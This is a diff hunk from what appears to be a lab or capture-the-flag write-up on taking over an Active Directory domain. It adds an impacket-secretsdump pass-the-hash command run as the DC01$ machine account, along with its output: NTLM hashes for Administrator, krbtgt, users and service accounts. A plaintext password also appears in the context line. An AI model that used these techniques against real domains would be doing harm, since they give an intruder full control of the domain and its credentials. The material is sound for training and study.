@@ -1014,5 +1014,27 @@ sudo python3 certighost.py -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' --dc-ip 10
 Now i have the NTLM hash of the `DC01$` machine account
 
 ```python
+impacket-secretsdump casper.local/'dc01$'@dc01.casper.hsm -hashes ':55a83395647a19e6a1775834018e2708' 
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bcbc89c6b432121c9aadb39395d4a9cc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:751239c0c4a6a50026befae0198cbd7d:::
+casper.hsm\xjr:1104:aad3b435b51404eeaad3b435b51404ee:dc98b3d4818ccb76428769f7f6340b0c:::
+casper.hsm\jags:1105:aad3b435b51404eeaad3b435b51404ee:68fc3adf1953f5e6851c0dd297562e08:::
+casper.hsm\jay:1106:aad3b435b51404eeaad3b435b51404ee:9b88ec231f4f0e5cb7d9edef1f399f6c:::
+casper.hsm\points:1108:aad3b435b51404eeaad3b435b51404ee:1637122b811f181857726417979aab92:::
+points\carlito:1109:aad3b435b51404eeaad3b435b51404ee:16a366acd9634ee5f958ebf1b4fc11df:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:55a83395647a19e6a1775834018e2708:::
+NIX01$:1103:aad3b435b51404eeaad3b435b51404ee:0cf15e4eee91372abddec89ec40e636e:::
+casper-gmsa$:1111:aad3b435b51404eeaad3b435b51404ee:7abcd8de1d2e107237f8fd5baea13d68:::
+
+...[SNIP]...
 ```
+
+Now i have the administrator NTLM hash
+
+
